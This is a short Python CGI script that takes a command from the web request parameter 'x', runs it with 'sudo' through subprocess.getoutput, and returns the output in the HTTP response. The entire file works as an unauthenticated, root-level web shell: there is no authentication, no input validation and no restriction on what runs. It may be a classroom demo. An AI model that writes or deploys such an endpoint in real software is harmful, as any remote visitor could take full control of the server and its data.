#!/usr/bin/python3

import cgi
import subprocess


print("content-type: text/html")
print()

mydata = cgi.FieldStorage()
command = mydata.getvalue("x")

output = subprocess.getoutput("sudo " + command)

print(output)

